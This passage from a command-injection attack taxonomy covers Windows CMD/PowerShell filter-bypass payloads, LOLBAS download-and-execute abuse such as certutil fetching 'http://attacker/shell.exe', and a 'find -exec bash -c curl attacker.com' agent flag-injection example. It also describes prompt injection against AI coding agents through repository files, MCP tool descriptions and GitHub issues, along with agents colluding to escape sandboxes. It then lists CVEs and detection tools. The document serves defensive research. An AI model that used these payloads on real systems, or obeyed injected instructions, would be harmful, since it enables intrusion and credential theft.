| **CMD chaining** | `&`, `&&`, `\|\|` function similarly to POSIX; `;` does not work | `1.1.1.1 & whoami` | Windows CMD-based application |
| **Caret escape bypass** | The `^` character in CMD is an escape character; inserted into commands it is silently ignored by the shell but breaks WAF pattern matching | `who^ami` | CMD only; defeats regex-based command detection |
| **Variable substring commands** | `%VARIABLE:~start,end%` extracts substrings; used to reconstruct blocked commands from existing env var values | `%COMSPEC:~0,1%md /c whoami` | CMD; knowledge of predictable env var contents |
| **Delayed expansion** | `!VARIABLE!` in `cmd /V` mode; enables variable references inside loops that evade static analysis | `set x=whoami&!x!` | CMD with delayed expansion enabled |
| **PowerShell encoding** | PowerShell accepts base64-encoded command via `-EncodedCommand` | `powershell -enc <b64payload>` | PowerShell available; bypasses command-string pattern matching |
| **Certutil download-and-exec** | `certutil -urlcache -split -f http://attacker/shell.exe` — native Windows binary for file download | As injection payload | Windows; no PowerShell restrictions needed; certutil always present |

### §11-2. Windows-Specific Binary Abuse (LOLBAS)

Living Off the Land Binaries and Scripts (LOLBAS) catalogs Windows-native executables that can be abused for file download, code execution, and defense evasion without dropping additional tools.

| Subtype | Key Binaries | Mechanism | Condition |
|---------|-------------|-----------|-----------|
| **File download and execute** | `certutil`, `bitsadmin`, `mshta`, `regsvr32`, `rundll32` | Download attacker payload using trusted signed binary | Outbound HTTP/HTTPS allowed from injected process |
| **Script execution** | `wscript`, `cscript`, `msiexec` | Execute scripts or MSI packages placed by attacker | Write access to temporary path |
| **Encoded execution** | `powershell -EncodedCommand`, `mshta vbscript:` | Execute encoded or inline scripts | PowerShell/MSHTA available |

---

## §12. AI Agent and LLM-Mediated Command Injection (2024–2025 Emerging)

The deployment of AI coding assistants, autonomous agents, and LLM-powered CI/CD automation has created an entirely new command injection attack surface. The structural vulnerability is identical to traditional command injection — untrusted data crosses a trust boundary into a command execution context — but the *trust boundary itself is now an LLM*, which cannot reliably distinguish data from instructions.

### §12-1. Indirect Prompt Injection to OS Command Execution

Indirect prompt injection occurs when an AI agent processes content from an *external, attacker-controlled data source* (web page, PDF, repository file, issue body) and that content contains instructions that override the agent's system prompt, causing it to execute privileged tool calls.

| Subtype | Mechanism | Real-World Example | Condition |
|---------|-----------|-------------------|-----------|
| **Web content injection** | Hidden text (CSS-invisible, white-on-white) in a web page read by a browsing agent | ZombAIs: browser agent reads malicious page → downloads malware | Agent has browser + shell access; no sandboxing |
| **Document-borne injection** | Hidden instructions in PDFs, Office files, or text documents uploaded to an agent context | Gemini Advanced memory poisoning (Johann Rehberger, 2025) | Agent reads documents; has persistent memory or tool access |
| **Repository / codebase injection** | Malicious instructions in CLAUDE.md, AGENT.md, `.cursorrules`, or code comments processed by coding agents | NVIDIA AI Red Team 2025; Cursor GHSA-534m-3w6r-8pqr | Coding agent processes project files without content validation |
| **MCP server tool-poisoning** | A malicious Model Context Protocol server registers tools with injected descriptions; the LLM selects and calls them | CVE-2025-53109/53110 (MCP filesystem server symlink escape) | MCP tools from untrusted sources; agent trusts tool descriptions |
| **Issue/PR body injection via AI triage bots** | AI agent processes GitHub issues for triage; attacker embeds CI commands in issue body | Cline December 2025: prompt injection in issue → `npm install` → cache poisoning → credential theft; Google Gemini CLI affected (patched within 4 days of disclosure) | AI triage workflow active; GITHUB_TOKEN in scope |

### §12-2. Argument Injection in AI Agent Tool Calls

When AI agents invoke CLI tools with user-influenced parameters, the argument injection surface of §2 applies at the agent layer.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Flag injection via natural language** | Attacker includes CLI flags in a prompt; LLM passes them to the invoked tool without sanitization | "Search the filesystem using the flag `-exec bash -c 'curl attacker.com' \;`" → `find -exec bash ...` | Agent invokes find/fd/ripgrep; no argument sandboxing |
| **LOLBIN abuse through agents** | Agent invoked with an approved binary; attacker appends dangerous options via prompt manipulation | Trail of Bits 2025: `go test -exec`, `ripgrep --pre` | Pre-approved binary allow-list without argument constraints |
| **Claude Code CVE** | Claude Code argument injection vulnerability | CVE-2025-54795 | Claude Code with agentic shell access |

### §12-3. Multi-Agent Trust Exploitation

In multi-agent architectures, a compromised low-privilege agent can manipulate a high-privilege peer through role confusion.

| Subtype | Mechanism | Example | Condition |
|---------|-----------|---------|-----------|
| **Privilege escalation via peer trust** | Agent A (low-privilege) manipulates Agent B (high-privilege) by impersonating an authorized orchestrator | ServiceNow Now Assist second-order injection (2025) | Multi-agent pipeline with privilege hierarchy; no agent-to-agent authentication |
| **Adversarial feedback loop** | Two agents manipulate each other to progressively relax safety constraints | Academic research 2025: agents "conspire" to exit sandbox | Peer-to-peer agent communication without shared state validation |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Typical Impact |
|----------|-------------|----------------------------|----------------|
| **Web app RCE** | HTTP request → parameter → system() call | §1, §3, §5, §7-1 | Server compromise, data exfiltration |
| **Blind async RCE** | Background processing (email, jobs, logging) | §5-2 (OAST), §1, §3 | Confirmed via DNS; same impact as direct |
| **IoT/Network device takeover** | CGI binary on embedded Linux | §8-1, §1, §3 | Network pivot, persistent access, DoS |
| **Windows enterprise target** | IIS/ASP.NET + CMD/PowerShell | §11, §4-2 (WorstFit), §3-3 | AD pivoting, ransomware deployment |
| **CI/CD pipeline compromise** | GitHub Actions / GitLab CI YAML | §9, §12-2 | Secrets exfiltration, supply chain backdoor |
| **AI agent RCE** | LLM coding agent / autonomous workflow | §12, §2-2, §9-2 | Host takeover, credential theft, supply chain |
| **Template engine chain** | Web app with template rendering | §6, §10 | Full RCE, data exfiltration, webshell |
| **File upload RCE** | Upload + media processing pipeline | §7-2, §1, §4 | Webshell, arbitrary file write |
| **SSH/Network protocol injection** | SSH client library with user-controlled hostnames | §8-2, §1 | Lateral movement, credential theft |
| **Supply chain SCA attack** | Dependency resolution + post-install scripts | §9-2 | Developer machine / CI runner compromise |
| **Log4Shell-style header injection** | Java application logging HTTP headers | §7-1, JNDI lookup chaining | Pre-auth RCE at scale |
| **AI agent CI/CD chain** | Prompt injection → CI workflow → publish pipeline | §12-1, §9-2 | Package compromise, 3rd-party supply chain |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Product | Impact / Bounty | Year |
|---------------------|-----------|---------|-----------------|------|
| §8-1 (CGI param injection) | CVE-2024-30169 | Zeus Z3 SME-01 HDMI encoder | Pre-auth RCE via logfile param | 2024 |
| §8-1 (CGI param injection) | CVE-2024-30167 | Atlona AT-OME-MS42 Matrix Switcher | Auth RCE as root via serverName JSON | 2024 |
| §8-1 (unauthenticated + API body) | CVE-2024-50603 | Aviatrix Network Controller | Pre-auth RCE; actively exploited | 2024 |
| §8-1 (API body + blocklist miss) | TOTOLINK X6000R (Unit42 CVE-2025) | TOTOLINK X6000R router | Unauthenticated RCE; agentName param | 2025 |
| §8-1 (auth CLI bypass) | CVE-2025-4230, CVE-2025-4231 | Palo Alto PAN-OS | Auth admin → root via CLI + web UI | 2025 |
| §8-1 (auth CLI bypass) | CVE-2024-8686 | Palo Alto PAN-OS 11.2.2 | Auth admin → root; CVSS 8.6 | 2024 |
| §8-1 (unauthenticated) | CVE-2024-46506 | NetAlertX | Pre-auth RCE on LAN; patched + 2 bypasses | 2024 |
| §8-1 (network appliance) | CVE-2025-58034 | Fortinet FortiWeb | Auth OS command injection; exploited in wild | 2025 |
| §8-1 (network appliance) | CVE-2025-64446 | Fortinet FortiWeb | Path traversal + CI; silent patch then KEV | 2025 |
| §8-1 (network monitoring) | CVE-2025-0675, CVE-2025-0415 | Moxa routers | Auth RCE → privilege escalation / DoS | 2025 |
| §4-2 + §2-1 (WorstFit) | CVE-2024-4577 | PHP-CGI on Windows | Pre-auth RCE; exploited by Tellyouthepass ransomware | 2024 |
| §4-2 + §7-2 (WorstFit + tar) | ElFinder CVE (WorstFit chain) | ElFinder file manager | RCE via argument injection in tar on Windows | 2025 |
| §4-2 + §7-2 (WorstFit + Python2 path) | Cuckoo Sandbox (WorstFit chain) | Cuckoo Sandbox | Path traversal to RCE via Unicode filename | 2025 |
| §9-1 + §9-2 (CI shell inject + mutable tag) | CVE-2025-30066 | tj-actions/changed-files | Secrets exfiltration; 23,000+ repos; supply chain | 2025 |
| §9-1 (pull_request_target shell inject) | Ultralytics YOLO (Dec 2024) | Ultralytics AI library | PyPI package backdoor; cryptominer; 60M+ downloads | 2024 |
| §9-2 + §12-1 (prompt inject → CI) | PromptPwnd (Aikido Security 2025) | Gemini CLI, Claude Code, Codex in GitHub Actions | Secrets exfiltration; 5+ Fortune 500 affected | 2025 |
| §12-1 + §9-2 (prompt inject → cache poison) | Cline supply chain (Dec 2025) | Cline VSCode extension (5M+ users) | npm package poisoning via issue title prompt injection | 2025 |
| §12-2 + §2-1 (AI agent arg inject) | CVE-2025-54795 | Claude Code | Argument injection; agentic shell execution | 2025 |
| §12-1 (MCP server symlink) | CVE-2025-53109, CVE-2025-53110 | @modelcontextprotocol/server-filesystem | Sandbox escape → arbitrary read/write → system takeover | 2025 |
| §6 + §10 (SSTI → RCE) | CVE-2024-32651 | changedetection.io | SSTI via Jinja2 → OS command execution | 2024 |
| §7-2 + §6 (filename → SSTI → RCE) | CVE-2024-32880 | pyLoad web UI | Auth RCE: file placement + SSTI chain | 2024 |
| §7-2 (non-ASCII filename traverse) | CVE-2024-13059 | AnythingLLM < 1.3.1 | Manager → file write → RCE | 2025 |
| §6 + §10 (SSTI FreeMarker) | Synack researcher disclosure 2024 | FreeMarker-based enterprise product | SSTI → RCE via ?lower_abc bypass | 2024 |
| §8-2 (SSH ProxyCommand) | CVE-2023-6004 | libssh2 | Hostname injection → RCE via ProxyCommand | 2023 |
| §12-1 (indirect prompt injection MCP) | GitHub Copilot CVE-2025-53773 | GitHub Copilot / VS Code | RCE via prompt injection; CVSS 9.6; settings.json modified | 2025 |
| §8-1 + escape chars (CLI) | CVE-2025-0975 | IBM MQ console | Auth RCE via improper neutralization of escape characters; CVSS 8.8 | 2025 |

---

## Detection Tools

| Tool | Type | Target Scope | Core Technique | Source |
|------|------|--------------|----------------|--------|
| **Commix** | Offensive | Web app OS command injection | Automates classic, timing, file-based, and OOB injection techniques; supports filter-bypass tamper scripts (space2ifs, space2htab, etc.) | commixproject/commix |
| **Tplmap** | Offensive | SSTI / eval() injection | Detects and exploits template injection across 15+ engines (Jinja2, FreeMarker, Velocity, EJS, etc.); sandbox escape modules included | epinna/tplmap |
| **Burp Suite Pro** | Offensive + Defensive | Web parameter fuzzing | Burp Collaborator provides OAST DNS/HTTP callback detection for blind injection; Intruder and Repeater for manual exploration | PortSwigger |
| **OWASP ZAP** | Offensive + Defensive | Web scanner | Active scan rules for OS command injection; extensible with custom scripts | OWASP |
| **Bashfuscator** | Offensive | Bash payload generation | Automates obfuscation of bash command injection payloads to evade WAF pattern matching | GitHub: Bashfuscator/Bashfuscator |
| **DOSfuscation** | Offensive | Windows CMD obfuscation | Generates heavily obfuscated CMD and PowerShell command injection payloads | GitHub: danielbohannon/Invoke-DOSfuscation |
| **Semgrep** | Defensive | SAST: source code | Detects dangerous function calls (`system()`, `exec()`, `shell_exec()`, `subprocess.call(shell=True)`) in source code; GitHub Actions CI injection rule sets | semgrep/semgrep |
| **ModSecurity + OWASP CRS** | Defensive | WAF rule engine | Paranoia Levels 1–4 enforce progressive signature depth for command injection patterns; PL3+ blocks repetitive non-word characters (glob bypass mitigation) | OWASP CRS project |
| **StepSecurity Harden-Runner** | Defensive | GitHub Actions runtime | Detects anomalous outbound network calls and process spawning from CI runners; flagged tj-actions compromise | stepsecurity/harden-runner |
| **Poutine** | Defensive | CI/CD SAST | Scans GitHub Actions workflows for unsafe context interpolation into `run:` steps (pwn request patterns); used by security researchers to find Ultralytics | boostsecurity-io/poutine |
| **GitGuardian** | Defensive | Secrets + workflow scanning | Detects compromised secrets in CI logs; discovered GhostAction campaign (September 2025) affecting 817 repos | GitGuardian |
| **F5 Advanced WAF / BIG-IP** | Defensive | WAF signature engine | Contains signatures for Windows environment variable substring commands, POSIX IFS abuse, and encoding obfuscation patterns | F5 Networks |
| **Nuclei** | Offensive | Template-based vulnerability scanner | Extensive CVE template library for command injection in IoT devices and network appliances; rapid detection at scale | projectdiscovery/nuclei |
| **Aikido Security** | Defensive | CI/CD + MCP security | Surfaces insecure CI/CD patterns via IaC scanning; monitors AI agent prompt injection exposure in GitHub Actions workflows | aikido.dev |
| **NVIDIA AI Red Team sandbox framework** | Defensive | AI agent sandboxing | Provides architectural controls (network egress block, file-write restriction) to mitigate indirect prompt injection to OS command execution | NVIDIA developer blog |

---

## Summary: Core Principles

Command injection endures as a vulnerability class not because developers are unaware of it, but because the *structural conditions that enable it* are deeply woven into common development patterns. Every instance of OS command injection reflects a moment where a developer treats a *shell* as a safe API, when in fact the shell is an interpreter — one that was designed to combine data and instructions in a single string.

The fundamental enabling property is **the shell's inability to distinguish data from commands in a concatenated string**. Unlike parameterized queries in SQL, most system-call interfaces do not provide a structural mechanism to separate "the command I intend to run" from "the data I intend to pass to it." When developers reach for `os.system()`, `exec()`, `subprocess(shell=True)`, or equivalent, they are choosing an interface that requires them to manually reconstruct this boundary through escaping — a task that is provably error-prone, especially across encoding layers, character sets, and proxy components.

Incremental patches fail because the root cause is architectural. Blocklist-based WAF rules are a perennial arms race: for every metacharacter blocked, researchers find an alternative (IFS for spaces, globbing for paths, Unicode lookalikes for quotes). Platform expansions continuously create new injection surfaces — embedded devices expose shell scripts via web UIs with no security review; CI/CD platforms create new string-interpolation contexts in YAML; AI agents create a new class of data-to-instruction boundary defined entirely in natural language. The WorstFit research (2025) demonstrates that even a sanitized string can be re-weaponized by OS-level character encoding conversion that happens *after* sanitization.

The structural solution is the **elimination of the shell as an intermediary** wherever possible. This means using `execve()`-family calls (which never invoke a shell and do not interpret metacharacters) or language-native APIs (`mkdir()` instead of `system("mkdir")`), using `subprocess` with list-form arguments rather than string-form, and — for the CI/CD and AI agent surface — treating all user-controlled or externally-sourced input as permanently untrusted regardless of its apparent origin. Where shell invocation cannot be avoided, the end-of-options `--` delimiter and strict allowlist validation of individual arguments (not just the overall string) provide meaningful reduction in attack surface. For AI agents, the principle must be extended: every natural-language input that influences a tool call must be treated as potentially hostile, regardless of who submitted the triggering message.

---

## References

1. Orange Tsai & Splitline Huang. "WorstFit: Unveiling Hidden Transformers in Windows ANSI!" DEVCORE Blog & Black Hat 2024/2025. https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/
2. Trail of Bits. "Prompt Injection to RCE in AI Agents." Trail of Bits Blog, October 2025. https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/
3. Aikido Security. "PromptPwnd: GitHub Actions AI Agents." 2025. https://www.aikido.dev/blog/promptpwnd-github-actions-ai-agents
4. Snyk. "Cline Supply Chain Attack: Prompt Injection + GitHub Actions Cache Poisoning." January 2026. https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/
5. Unit 42 (Palo Alto). "GitHub Actions Supply Chain Attack: tj-actions/changed-files." March 2025. https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
6. Unit 42 (Palo Alto). "TOTOLINK X6000R: Three New Vulnerabilities." October 2025. https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/
7. Rhino Security Labs. "CVE-2024-46506: Unauthenticated RCE in NetAlertX." January 2025. https://rhinosecuritylabs.com/research/cve-2024-46506-rce-in-netalertx/
8. Securing.pl. "CVE-2024-50603: Aviatrix Network Controller Command Injection." January 2025. https://www.securing.pl/en/cve-2024-50603-aviatrix-network-controller-command-injection-vulnerability/
9. boostsecurity.io. "Defensive Research, Weaponized: The 2025 State of Pipeline Security." December 2025. https://boostsecurity.io/blog/defensive-research-weaponized-the-2025-state-of-pipeline-security/
10. OWASP. "OS Command Injection Defense Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
11. PortSwigger Web Security Academy. "OS Command Injection." https://portswigger.net/web-security/os-command-injection
12. swisskyrepo. "PayloadsAllTheThings / Command Injection." https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
13. IBM X-Force. "IoT Exploitation During Security Engagements." November 2025. https://www.ibm.com/think/x-force/iot-exploitation-during-security-engagements
14. commixproject. "Commix: Automated All-in-One OS Command Injection Exploitation Tool." https://commixproject.com/
15. GitGuardian. "The GhostAction Campaign: 3,325 Secrets Stolen." September 2025. https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/
16. Filippo Valsorda. "A Retrospective Survey of 2024/2025 Open Source Supply Chain Compromises." October 2025. https://words.filippo.io/compromise-survey/
17. OffSec. "CVE-2024-13059: Path Traversal in AnythingLLM for RCE." February 2025. https://www.offsec.com/blog/cve-2024-13059/
18. NVIDIA Technical Blog. "Practical Security Guidance for Sandboxing Agentic Workflows." February 2026. https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/
19. ikangai. "The Complete Guide to Sandboxing Autonomous Agents." December 2025. https://www.ikangai.com/the-complete-guide-to-sandboxing-autonomous-agents-tools-frameworks-and-safety-essentials/
20. Cybersecurity Dive. "Researchers warn command injection flaw in Fortinet FortiWeb is under exploitation." November 2025. https://www.cybersecuritydive.com/news/command-injection-flaw-fortinet-fortiweb-exploitation/806027/
21. HackerOne. "How To: Command Injections." https://www.hackerone.com/blog/how-command-injections
22. reddelexc. "HackerOne Reports - Top RCE." https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPRCE.md
23. Palo Alto Networks. CVE-2025-4230, CVE-2025-4231, CVE-2024-8686 Security Advisories. https://security.paloaltonetworks.com/
24. Wiz Blog. "GitHub Action tj-actions/changed-files Supply Chain Attack." March 2025. https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
25. YesWeHack. "Server-Side Template Injection Exploitation with RCE Everywhere." March 2025. https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation

---

*This document was created for defensive security research and vulnerability understanding purposes.*
